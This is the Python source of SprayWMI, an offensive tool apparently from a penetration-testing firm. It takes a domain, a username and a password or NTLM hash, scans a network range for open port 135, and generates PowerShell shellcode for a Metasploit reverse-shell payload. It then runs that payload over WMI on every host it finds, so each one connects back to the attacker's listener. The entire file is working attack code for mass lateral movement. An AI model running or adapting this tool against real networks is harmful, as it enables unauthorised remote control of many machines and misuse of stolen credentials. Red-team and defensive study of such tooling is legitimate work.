#!/usr/bin/python
#
#   __   __   __
# /__` |__) |__)  /\  \ / |  |  |\/| |
# .__/ |    |  \ /~~\  |  |/\|  |  | |
#
#
# SprayWMI combines unicorn powershell injection with WMI remote execution.
# Be sure to configure the three options below for unicorn and wmi paths. Mandatory or will not work.
#
# Version 0.1
#
# Written by: David Kennedy (@HackingDave) - @TrustedSec
# Special thanks to: Justin Elze and Larry Spohn @TrustedSec
#
# Make sure to close meterpreter properly (exit or kill session) - or else the server may spike high CPU - weirdness with powershell

# CONFIGURE THE PATH TO UNICORN: github.com/trustedsec/unicorn
import subprocess
import os
import sys
import time
definepath = os.getcwd()
unicorn = ("/pentest/post-exploitation/unicorn/")
if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
	if not os.path.isdir(definepath + "/unicorn/"):
		print ("[!] Unicorn not detected, checking out for you automatically")
		subprocess.Popen("git clone https://github.com/trustedsec/unicorn unicorn/", shell=True).wait()

	unicorn = (definepath + "/unicorn/")
				
# CONFIGURE PATH TO WMIS - https://www.trustedsec.com/june-2015/no_psexec_needed/
# if you have trouble with this on 64 bit - try:
# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
wmi = ("./wmis")
if os.path.isfile("wmis"):
	subprocess.Popen("chmod +x wmis", shell=True).wait()

# flag to turn verbosity on
verbose = "off"

try: import pexpect
except ImportError:
	print ("[!] python-pexpect not installed, attempting to install it for you...")
	subprocess.Popen("python -m pip install pexpect", shell=True).wait()
	try: import pexpect
	except ImportError:
		print ("[!] Sorry couldn't install pexpect for you, try installing manually - python-pexpect")
		sys.exit()

# main variable assignment from command line parameters
optional = ""
try:

	domain = sys.argv[1] # domain for the system to attack
	user = sys.argv[2] # username for windows box
	password = sys.argv[3] # password or lm:ntlm hash for windows box
	cidr = sys.argv[4] # can be 192.168.1.1/24 format or file.txt with ips 
	meta = sys.argv[5] # metasploit payload - ex. windows/meterpreter/reverse_tcp
	revshell = sys.argv[6] # reverse shell IP address (your attacker machine LHOST)
	revport = sys.argv[7] # reverse port for the reverse shell (your attacker LPORT)
	try:
		if sys.argv[8] == "no": # optional variable to spawn listener
			optional = "no"
		else: optional = ""
	except IndexError: pass

# throw syntax if we don't have all of our sys args taken care of
except IndexError:
	print (r"""
 __   __   __                        
/__` |__) |__)  /\  \ / |  |  |\/| | 
.__/ |    |  \ /~~\  |  |/\|  |  | | 


	Written by: David Kennedy @ TrustedSec
	
                                     """)
	print ("SprayWMI is a method for mass spraying unicorn powershell injection to CIDR notations.\n")

	print ("""Flag descriptions:

DOMAIN - domain you are attacking - if its local, just specify workgroup
USERNAME - username to authenticate on the remote Windows system
PASSWORD - password or password hash lm:ntlm to use on the remote Windows system
CIDR_RANGE,CIDR_RANGE or ips.txt - you can specify a single ip, a CIDR range (192.168.1.1/24) or multiple CIDRs such as 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt) which has single IP addresses on a new line. 
METASPLOIT_PAYLOAD - this is the payload you want to use example: windows/meterpreter/reverse_tcp
REVERSE_SHELL_IP - this is the IP address of your attacker machine that you want to create a listener or use an already established listener
REVERSE_SHELL_PORT - port to connect back on for the reverse
OPTIONAL: NO - specify no if you do not want to create a listener - this is useful if you already have a listener established. If you do not specify a value here, it will automatically create a listener for you.
""")
	print ("Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>\n")
	sys.exit()

print ("[*] Launching SprayWMI on the hosts specified...")

# start unicorn first
if os.path.isfile(unicorn + "/unicorn.py"):
	os.chdir(unicorn)
	print ("[*] Generating shellcode through unicorn, could take a few seconds...")
	subprocess.Popen("python unicorn.py %s %s %s" % (meta, revshell, revport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	if optional == "":
		print ("[*] Launching the listener in the background...")	
		time.sleep(1)
		child = pexpect.spawn("msfconsole -r %s/unicorn.rc" % (unicorn))
	        print ("[*] Waiting for the listener to start first before we continue forward...")
	        print ("[*] Be patient, Metaploit takes a little bit to start...")
	        child.expect("Starting the payload handler", timeout=30000)
	unicorn_code = file(unicorn + "/powershell_attack.txt", "r").read()
	# all back to normal
	os.chdir(definepath)

# if not found, tell them to check it out
else:
	print ("Unicorn was not found. Please run git clone https://github.com/trustedsec/unicorn, then edit spraywmi.py and point the unicorn = variable to your unicorn installation.")
	sys.exit()

if not os.path.isfile(cidr):
	# if we have multiple cidrs then split them up for nmap
	if "," in cidr:
		print ("[*] Multiple CIDR notations found, splitting them up...")
		cidr_range = cidr.split(",")
		cidr_temp = ""
		for cidrs in cidr_range:
			cidr_temp = cidr_temp + cidrs + " "
	
		# our output with spaces
		cidr = cidr_temp

	# sweep networks first
	print ("[*] Sweeping network for ports that are open first, then moving through... Be patient.")
	subprocess.Popen("nmap -PN -p 135 --open -oG - %s -T 5 | awk '$NF~/msrpc/{print $2}' > openwmi.txt" % (cidr), shell=True).wait()

	# next we create the wmi command
	fileopen = file("openwmi.txt", "r").readlines()

# if we are using a file
if os.path.isfile(cidr):
	fileopen = file(cidr, "r").readlines()

counter = 0
for line in fileopen:
	print line
	counter = 1

if counter == 1:
	for ip in fileopen:
		ip = ip.rstrip()
		command = ('''%s -U %s/%s%%%s //%s "%s"''' % (wmi,domain,user,password,ip,unicorn_code))
		print ("[*] Launching WMI spray against IP: %s - you should have a shell in the background. Once finished, shell will spawn" % (ip))
		if verbose == "off":
			subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		if verbose == "on":
			subprocess.Popen(command)

	# cleanup
	if os.path.isfile("openwmi.txt"):
		os.remove("openwmi.txt")
	# now interact with Metasploit
	print ("[*] Spraying is still happening in the background, shells should arrive as they complete.")
	
	if optional == "":
		print ("[*] Interacting with Metasploit...")
		# interact with metasploit
		child.interact()
	else:
		print "[*] Running in the background, everything is completed but keeping a loop so subprocess has time to complete.."
		while 1:
			try:
				print "[*] If you are finished, just control-c to exit."
				time.sleep(15)

			except KeyboardInterrupt:
				print "[*] Exiting SprayWMI...\n"
				sys.exit()
else:
	print ("[*] Unable to identify a port open on the range specified (135)")
	sys.exit()
